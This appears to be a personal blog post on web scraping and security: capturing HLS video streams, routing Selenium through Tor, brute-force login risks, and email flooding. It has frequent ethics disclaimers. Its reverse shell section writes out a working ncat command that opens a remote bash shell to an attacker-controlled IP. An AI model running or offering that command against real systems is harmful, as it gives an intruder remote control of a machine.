---
title: "Web Scraping, Security, and Ethical Considerations"
date: Sat Aug 12 2023 01:40:12
type: web
---

Reminder: This blog post is for educational purposes only. All information provided should be used ethically and legally. Misuse of these techniques can result in serious legal consequences.

Being able to do something is not a justification to do so. Please don't do this. Technology is for ensuring your freedom, not for harming others.

## Scraping Videos 

These tools should only be used for legal purposes. Neglecting copyright is a serious issue

Video content can often be a target for scraping. For example, some video sites use HTML tags like: `<video src="blob:https://www.youtube.com/34b0564d-9f35-4581-bf5c-eed542280a0b"></video>`. Even though blob URLs obscure the source, they often load m3u8 or ts files. An m3u8 file usually consists of many segments of video files (they are combined together). It is possible to do so using an HLS sniffer. Selenium can also be used to capture the performance logs and extract URLs. Please always comply to terms and don't use steamlink for unlawful purposes.

## Tor Crawling

Warning: Be cautious about the Dark Web as it contains disturbing content. It is not advised to visit the Dark Web, nor use Tor for unethical purposes. 

Only use tor crawling when anonymity is a priority and when you adhere to platform's rules. In Selenium, specifically
```
options=Options()
options.set_preference("network.proxy.type", 1)
options.set_preference("network.proxy.socks", "127.0.0.1")
options.set_preference("network.proxy.socks_port", 9050)
options.set_preference("network.proxy.socks_version", 5)
options.set_preference("network.proxy.socks_remote_dns", True)
browser = Firefox(options=options)
```

## Understanding Brute-Forcing

Ethical Reminder: This is illegal and unethical. Do not engage in brute-forcing. Instead, focus on strengthening your defenses.

Always use secure passwords by utilizing KeePass(offline password manager) to generate high entropy passwords. Simple security practice makes you the harder target. It is a great way to stop attackers from gaining access(if a weak website leaked the password with a weak hash). It is advised when designing a web server use a difficult captcha when users log in, and utilize Cloudflare for protection. Cloudflare's Captcha is excellent for individual developers to protext DDOS.

Attackers might use multiple IPs to attempt brute-forcing passwords by sending numerous requests with selenium sendkeys, like `button=driver.find_element()` and `button.click()`. Small websites with weak security are usually more targeted.

## Reverse Shell

Always safeguard cloud machines with public ipv4 as they are the targets of many random attacks. On my Linode machine I could see people trying sshd passwords. Don't delete the root password or use a weak root password!

Some malicious programs gain access (espeically on Windows exes) to the network! It is important to download from secure sources(like official ArchLinux packages and inspecting the PKGBUILD). Some malicious programs may gain access to the network to participate in DDOS.

I tried this experiment with my Linode. I can gain remote access to my Linode machine by using ncat. On the Linode machine `nohup ncat [attacker's IP] [port] -e /bin/bash &` On my laptop listen, after this I gain access to execute bash script on my laptop. Only do this in a controlled environment and adheres to laws!


## Email Concerns

Respect the privacy of emails.

Potential Threats: Attackers might flood a victim’s email by subscribing to mailing lists(designed not to go to spam), causing an inundated inbox. 

## Conclusion

It is important to follow the rules and use official APIs when crawling the website. Not everything feasible is legal and justified.


## References

- [YouTube Terms of Service](https://www.youtube.com/t/terms)
- [Fetchv](https://fetchv.net/)
- [Tor Project](https://www.torproject.org/)
- [NetworkManager CLI](https://developer.gnome.org/NetworkManager/stable/nmcli.html)
